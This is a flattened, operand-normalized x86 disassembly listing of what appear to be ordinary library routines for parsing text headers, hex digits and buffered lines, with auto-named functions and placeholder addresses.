sub ecx eax
xor edx edx
mov dl [ ecx + esi ]
mov dl [ ecx + esi ]
not dl
and edx 0xff
jmp r-xdata
xor eax eax
xor ecx ecx
test ebp ebp
jle r-xdata
mov edx [ esp + 0x8 ]
mov eax 0x1
pop ebp
mov [ edx ] ecx
retn
push 0xa6
or eax edx
inc ecx
cmp ecx ebp
jl r-xdata
sub_1004acc0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esp + 0xc ]
push eax
test [ ecx + 0x14 ] 0x1
je r-xdata
call sub_10029950
add esp 0x4
mov [ esi ] 0x0
call sub_100298f0
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_1004ad00
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
test esi esi
jne r-xdata
push edi
push esi
call sub_10029870
and al 0x7
add esp 0x4
neg al
sbb eax eax
inc eax
mov edi eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
or eax 0xffffffff
pop esi
retn
push esi
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax edi
pop edi
pop esi
retn
test edi edi
je r-xdata
push eax
push esi
call sub_10029ef0
add esp 0x8
mov [ eax ] 0x0
inc eax
sub_1004ad60
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx [ esp + 0xc ]
push eax
mov eax [ esp + 0x14 ]
push eax
push ecx
call sub_10029d50
add esp 0xc
test eax eax
jne r-xdata
call sub_100299b0
mov [ esi ] eax
mov eax 0x1
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov edx [ esp + 0x1c ]
push eax
test [ edx + 0x14 ] 0x1
je r-xdata
call sub_10029950
add esp 0x4
mov [ esi ] 0x0
call sub_100298f0
add esp 0x4
mov [ esi ] 0x0
xor eax eax
pop esi
retn
sub_1004add0
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x30 ]
push 0x0
lea edx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x1c ] 0x0
call sub_1004ae70
add esp 0x1c
test eax eax
jne r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x20 ]
push esi
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x8 ]
push ecx
push edx
push eax
call [ esp + 0x1c ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
add esp 0x8
retn
mov ecx [ esp + 0x4 ]
push ecx
call sub_1001d740
add esp 0x4
mov eax esi
pop esi
add esp 0x8
retn
push 0x53
push r--data
push 0xd
push 0x67
push 0x9
call sub_1001de60
add esp 0x14
sub_1004ae70
mov eax 0x28
call sub_1001d0d0
push ebx
push ebp
push esi
lea eax [ esp + 0x18 ]
push edi
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x54 ]
lea eax [ esp + 0x1c ]
push edx
xor ebx ebx
push eax
push ecx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x34 ] ebx
call sub_1004b930
mov ebp [ esp + 0x5c ]
add esp 0x14
test eax eax
je r-xdata
call sub_1001e000
and eax 0xfff
cmp eax 0x6c
jne r-xdata
mov edi [ esp + 0x14 ]
mov esi ebp
mov eax edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x28
retn
push ebp
push r--data
push 0x2
call sub_1001e1a0
add esp 0xc
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call sub_1004b700
add esp 0x8
test eax eax
je r-xdata
mov esi r--data
mov eax edi
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1004b4b0
add esp 0x14
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
mov ecx [ esp + 0x10 ]
push ecx
call sub_1001d740
add esp 0x4
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x40 ]
mov [ edx ] eax
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x1c ]
cmp eax ebx
mov [ ecx ] edx
je r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp eax ebx
mov [ esp + 0x20 ] 0x1
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1001d740
mov esi [ esp + 0x24 ]
add esp 0x4
cmp esi ebx
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi r--data
mov eax edi
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
push edi
call sub_1001d740
mov eax [ esp + 0x1c ]
push eax
call sub_1001d740
mov ecx [ esp + 0x18 ]
push ecx
call sub_1001d740
lea edx [ esp + 0x28 ]
lea eax [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x60 ]
lea edx [ esp + 0x28 ]
push ecx
push edx
push eax
call sub_1004b930
add esp 0x20
test eax eax
jne r-xdata
mov esi r--data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_1004b4b0
mov eax 0x4b4
call sub_1001d0d0
mov eax [ esp + 0x4c0 ]
push ebx
mov ebx [ esp + 0x4bc ]
push ebp
mov ebp [ eax ]
push esi
mov eax [ ebx ]
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x4b4
retn
mov eax [ esp + 0x4d4 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x4d8 ]
lea ecx [ esp + 0xc4 ]
push edx
push 0x0
push 0x400
push ecx
call eax
add esp 0x10
mov esi [ esp + 0x4d8 ]
test esi esi
je r-xdata
lea edx [ esp + 0x18 ]
push 0x0
push edx
push 0x1
push eax
lea eax [ esp + 0xd4 ]
lea esi [ ebx + 0x4 ]
push eax
push esi
call sub_10025900
mov ecx [ ebx ]
push eax
push ecx
call sub_10059c60
lea edx [ esp + 0x58 ]
mov [ esp + 0x30 ] ebp
push edx
call sub_1001d7d0
mov ecx [ ebx ]
lea eax [ esp + 0x3c ]
push esi
push eax
push 0x0
lea edx [ esp + 0x68 ]
push ecx
push edx
call sub_1002b650
mov eax [ esp + 0x48 ]
mov esi [ esp + 0x504 ]
push eax
lea ecx [ esp + 0x50 ]
push esi
push ecx
lea edx [ esp + 0x7c ]
push esi
push edx
call sub_1002b820
mov ecx [ esp + 0x60 ]
add esp 0x4c
lea eax [ esp + 0x10 ]
add ecx esi
push eax
lea edx [ esp + 0x3c ]
push ecx
push edx
call sub_1002b940
mov esi eax
lea eax [ esp + 0x44 ]
push eax
call sub_1001db30
lea ecx [ esp + 0xd4 ]
push 0x400
push ecx
call sub_10026870
lea edx [ esp + 0x30 ]
push 0x20
push edx
call sub_10026870
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
add esp 0x20
add eax edx
test esi esi
mov [ esp + 0x10 ] eax
jne r-xdata
push 0x196
push r--data
push 0x68
push 0x6a
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4b4
retn
call sub_10059b90
mov esi eax
test esi esi
jne r-xdata
mov edi esi
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov eax ecx
cmp eax 0x400
jle r-xdata
mov ecx [ esp + 0x4d0 ]
mov [ ecx ] eax
push 0x1ac
push r--data
push 0x65
push 0x6a
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4b4
retn
push 0x0
push esi
lea eax [ esp + 0xcc ]
push 0x400
push eax
call sub_10059ba0
add esp 0x10
test eax eax
jne r-xdata
mov esi r--data
mov ecx eax
lea edi [ esp + 0xc4 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x400
push 0x69
push r--data
push 0x6d
push 0x64
push 0x9
call sub_1001de60
add esp 0x14
mov ecx 0x100
xor eax eax
lea edi [ esp + 0xc4 ]
[ edi ]
jmp r-xdata
lea edi [ esp + 0xc4 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
cmp eax 0x4
jge r-xdata
test eax eax
jg r-xdata
push 0x4
push r--data
push _itoa@IAT
call fprintf
push 0x0
push esi
lea ecx [ esp + 0xd8 ]
push 0x400
push ecx
call sub_10059ba0
add esp 0x1c
test eax eax
je r-xdata
sub_1004b700
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
mov [ ebp ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov al [ esi ]
test al al
je r-xdata
cmp al 0xa
je r-xdata
push 0xb
push r--data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov al [ esi + 0xb ]
add esi 0xb
cmp al 0x34
je r-xdata
push 0x1be
push r--data
push 0x6b
push 0x6b
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ esi + 0x1 ]
inc esi
cmp al 0x2c
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
inc esi
push 0x9
push r--data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov al [ esi ]
cmp al 0xa
je r-xdata
push 0x1c3
push r--data
push 0x6a
push 0x6b
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ esi ] 0x0
jne r-xdata
test al al
je r-xdata
inc esi
push 0xa
push r--data
push esi
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x1c7
push r--data
push 0x70
push 0x6b
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ esi + 0x1 ]
inc esi
cmp al 0xa
jne r-xdata
add esi 0xa
mov edi esi
push 0x1ca
push r--data
push 0x69
push 0x6b
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp bl 0x2d
je r-xdata
cmp bl 0x5a
jle r-xdata
inc esi
jmp r-xdata
cmp bl 0x30
jl r-xdata
mov bl [ esi ]
cmp bl 0x41
jl r-xdata
push edi
mov [ esi ] 0x0
call sub_10023290
push edi
call sub_10021b10
mov [ ebp ] eax
add esp 0x8
mov [ esi ] bl
inc esi
test eax eax
jne r-xdata
cmp bl 0x39
jg r-xdata
mov edx [ eax + 0xc ]
lea edi [ ebp + 0x4 ]
test edx edx
mov [ esp + 0x18 ] edi
jle r-xdata
push 0x1e4
push r--data
push 0x72
push 0x6b
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
lea ebp [ edx + edx ]
xor edi edi
test ebp ebp
jle r-xdata
mov ecx edx
xor eax eax
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov al [ esi ]
cmp al 0x30
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x46
jg r-xdata
movsx ebx al
sub ebx 0x30
jmp r-xdata
push 0x1ff
push r--data
push 0x67
push 0x65
push 0x9
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp al 0x66
jg r-xdata
movsx ebx al
sub ebx 0x37
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax edi
cdq
sub eax edx
inc esi
sar eax 0x1
add eax ecx
mov ecx edi
not ecx
mov dl [ eax ]
and ecx 0x1
shl ecx 0x2
shl bl cl
or dl bl
inc edi
cmp edi ebp
mov [ eax ] dl
jl r-xdata
movsx ebx al
sub ebx 0x57
sub_1004b930
mov eax 0x17c
call sub_1001d0d0
push ebx
push ebp
push esi
xor esi esi
push edi
mov [ esp + 0x24 ] esi
mov [ esp + 0x10 ] esi
mov [ esp + 0x20 ] esi
call sub_1001dc60
mov edi eax
mov [ esp + 0x1c ] edi
call sub_1001dc60
mov ebx eax
mov [ esp + 0x14 ] ebx
call sub_1001dc60
mov ebp eax
cmp edi esi
mov [ esp + 0x18 ] ebp
je r-xdata
push edi
call sub_1001dca0
push ebx
call sub_1001dca0
push ebp
call sub_1001dca0
push 0x27f
push r--data
push 0x41
push 0x6d
push 0x9
call sub_1001de60
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x17c
retn
cmp ebx esi
je r-xdata
cmp ebp esi
je r-xdata
mov ebp [ esp + 0x190 ]
lea eax [ esp + 0x2c ]
push 0xfe
push eax
push ebp
mov [ esp + 0x136 ] 0x0
call sub_10020b20
add esp 0xc
cmp eax esi
jle r-xdata
push 0x28a
push r--data
push 0x6c
jmp r-xdata
cmp [ esp + eax + 0x2c ] 0x20
jg r-xdata
push 0x6d
push 0x9
call sub_1001de60
add esp 0x14
inc eax
push 0xb
lea ecx [ esp + 0x30 ]
push r--data
mov [ esp + eax + 0x34 ] 0xa
push ecx
mov [ esp + eax + 0x39 ] 0x0
call strncmp
add esp 0xc
test eax eax
jne r-xdata
dec eax
jns r-xdata
lea eax [ esp + 0x2c ]
push 0xfe
push eax
push ebp
call sub_10020b20
add esp 0xc
cmp eax esi
jg r-xdata
lea edi [ esp + 0x37 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push 0x6
mov ebx ecx
push r--data
lea edx [ esp + ebx + 0x39 ]
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
lea ecx [ ebx + 0x9 ]
push ecx
push edx
call sub_1001dce0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
lea ecx [ ebx - 0x6 ]
mov edx ecx
lea esi [ esp + 0x37 ]
mov edi [ eax + 0x4 ]
push 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ eax + 0x4 ]
mov esi [ esp + 0x18 ]
push esi
mov [ eax + ebx - 0x6 ] 0x0
xor ebx ebx
call sub_1001dce0
add esp 0x8
test eax eax
jne r-xdata
push 0x299
push r--data
push 0x41
jmp r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esp + 0x2c ]
push 0xfe
push edx
push ebp
mov [ ecx ] 0x0
call sub_10020b20
mov ebp eax
add esp 0xc
test ebp ebp
jle r-xdata
push 0x2a3
push r--data
push 0x41
jmp r-xdata
mov esi [ esp + 0x18 ]
push 0x400
push esi
mov [ esp + 0x18 ] 0x0
call sub_1001dce0
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + ebp + 0x2c ] 0x20
jg r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x20 ]
test eax eax
mov [ edx ] 0x0
jne r-xdata
push 0x2bc
push r--data
push 0x41
jmp r-xdata
inc ebp
mov [ esp + ebp + 0x2c ] 0xa
inc ebp
mov [ esp + ebp + 0x2c ] 0x0
mov al [ esp + 0x2c ]
cmp al 0xa
je r-xdata
dec ebp
jns r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] ebx
mov ebx [ esp + 0x190 ]
lea eax [ esp + 0x2c ]
push 0xfe
push eax
push ebx
call sub_10020b20
mov ebp eax
add esp 0xc
test ebp ebp
jle r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ ebx + ebp + 0x9 ]
push eax
push ecx
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
push 0x2ed
push r--data
push 0x66
mov eax [ ebx + 0x4 ]
lea edx [ esp + 0x35 ]
push esi
push edx
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
push 0x9
mov edi [ ebx + 0x4 ]
push r--data
[ edi ]
not ecx
dec ecx
mov esi ecx
lea ecx [ esp + 0x34 ]
push ecx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
push 0x2af
push r--data
push 0x41
jmp r-xdata
push 0x9
lea edx [ esp + 0x30 ]
push r--data
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x6
lea ecx [ esp + esi + 0x39 ]
push r--data
push ecx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
test ebp ebp
jl r-xdata
mov [ esp + 0x20 ] 0x1
mov eax [ esp + 0x14 ]
mov edi ebx
mov ecx ebp
lea esi [ esp + 0x2c ]
mov edx [ eax + 0x4 ]
push 0xfe
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0x4 ]
lea ecx [ ebx + ebp ]
lea eax [ esp + 0x30 ]
add ebx ebp
mov [ ecx + edx ] 0x0
mov ecx [ esp + 0x194 ]
push eax
push ecx
call sub_10020b20
mov ebp eax
add esp 0xc
test ebp ebp
jg r-xdata
lea edx [ esp + 0x12c ]
push edx
call sub_10059e60
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
push eax
push edx
push eax
lea eax [ esp + 0x140 ]
push eax
call sub_10059e80
add esp 0x18
test eax eax
jge r-xdata
inc ebp
mov [ esp + ebp + 0x2c ] 0xa
inc ebp
cmp ebp 0x41
mov [ esp + ebp + 0x2c ] 0x0
je r-xdata
cmp [ esp + ebp + 0x2c ] 0x20
jg r-xdata
jmp r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0x28 ]
add edx ebx
push ecx
lea eax [ esp + 0x130 ]
push edx
push eax
call sub_1005a1d0
add esp 0xc
test eax eax
jge r-xdata
push 0x2f7
push r--data
push 0x64
jmp r-xdata
push 0x9
lea ecx [ esp + 0x30 ]
push r--data
push ecx
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x24 ] 0x1
dec ebp
jns r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
add ecx eax
mov [ esp + 0x10 ] ecx
je r-xdata
push 0x2fd
push r--data
push 0x64
jmp r-xdata
cmp ebp 0x41
jg r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_1001dca0
mov ecx [ esp + 0x18 ]
push ecx
call sub_1001dca0
mov edx [ esp + 0x20 ]
push edx
call sub_1001dca0
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x17c
retn
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x194 ]
mov edi [ esp + 0x198 ]
mov ebx [ esp + 0x19c ]
mov edx [ eax + 0x4 ]
push eax
mov [ esi ] edx
mov esi [ esp + 0x18 ]
mov edx [ esi + 0x4 ]
mov [ edi ] edx
mov edi [ esp + 0x1c ]
mov edx [ edi + 0x4 ]
mov [ ebx ] edx
mov edx [ esp + 0x1a4 ]
mov [ edx ] ecx
call sub_1001d740
push esi
call sub_1001d740
push edi
call sub_1001d740
add esp 0xc
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x17c
retn
mov edx [ esp + 0x10 ]
lea eax [ edx + ebp + 0x9 ]
push eax
push esi
call sub_1001dd90
add esp 0x8
test eax eax
je r-xdata
push 0x2ce
push r--data
push 0x41
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov ecx ebp
lea esi [ esp + 0x2c ]
mov edi [ eax + 0x4 ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
add eax ebp
mov [ eax + ecx ] 0x0
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
add ecx ebp
test eax eax
mov [ esp + 0x10 ] ecx
jne r-xdata
lea eax [ esp + 0x2c ]
push 0xfe
push eax
push ebx
